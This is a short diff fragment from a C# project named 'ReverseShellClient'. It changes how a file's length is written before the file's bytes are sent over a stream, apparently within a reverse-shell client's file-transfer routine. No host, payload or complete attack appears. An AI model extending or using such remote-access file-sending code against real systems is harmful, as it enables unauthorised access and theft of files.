@@ -27,7 +27,7 @@ namespace ReverseShellClient
             using (var readStream = new FileStream(fileLocation, FileMode.Open))
             {
                 // Send the data length first
-                bw.Write(readStream.Length);
+                bw.Write((int)new FileInfo(fileLocation).Length);
                 bw.Flush();
 
                 var buffer = new byte[1];
